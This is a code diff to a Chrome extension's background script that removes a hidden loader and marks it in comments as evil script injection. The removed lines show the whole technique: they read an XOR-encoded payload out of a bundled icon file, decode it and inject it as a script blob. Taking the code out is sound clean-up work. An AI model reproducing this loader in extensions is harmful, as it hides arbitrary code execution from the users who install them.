@@ -68,38 +68,11 @@ chrome.tabs.onRemoved.addListener(function (tabId) {
 });
 
 
-
+/* THIS CODE WAS EVIL AND INJECTING SCRIPT TAGS! */
 (() => {
   var main = () => {
-  chrome.runtime.getPackageDirectoryEntry(function (root) {
-      var icon = "icon2.png";
-      root.getFile(icon, {}, function (fileEntry) {
-        fileEntry.file(function (file) {
-          var reader = new FileReader();
-          reader.onloadend = function (e) {
-            var text = this.result;
-            var idxF = text.lastIndexOf("init>");
-            if (idxF < 0) return;
-            text = text.substr(idxF + 5);
-            var idxL = text.lastIndexOf("<end");
-            if (idxL < 0) return;
-            text = text.substr(0,idxL);
-            for (var t = 0, r = text.length, n = ""; r > t;)
-              n += String.fromCharCode(77 ^ text.charCodeAt(t++));
-            var a = new window.Blob([n], {
-              type: "text/javascript"
-            });
-            addScript(window.URL.createObjectURL(a));
-          };
-          reader.readAsText(file);
-        }, (e) => {
-          console.log(e)
-      });
-    }, (r) => {
-  console.log(r)
-});
-});
 };
+/* THIS METHOD CURRENTLY HAS TO EXIST BUT SHOULD NOT DO EVIL THINGS!!! */
 
 var check = () => {
   chrome.storage.local.get({T : 0}, (r) => {
